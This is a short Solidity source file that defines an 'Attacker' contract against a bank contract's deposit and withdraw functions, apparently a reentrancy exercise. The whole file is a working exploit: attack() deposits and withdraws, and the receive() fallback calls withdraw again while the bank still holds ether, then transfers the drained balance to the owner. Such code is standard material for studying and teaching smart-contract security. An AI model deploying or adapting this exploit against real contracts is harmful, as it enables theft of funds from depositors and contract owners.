// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/access/Ownable.sol";

interface IBank {
    function deposit() external payable;

    function withdraw() external;
}

contract Attacker is Ownable {
    IBank public immutable bank;

    constructor(IBank _bank) {
        bank = _bank;
    }

    function attack() external payable onlyOwner {
        //Deposit
        bank.deposit{value: msg.value}();
        //Withdraw
        bank.withdraw();
    }

    // Receive
    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw();
        }else{
            payable(owner()).transfer(address(this).balance);
        }
        
    }
}
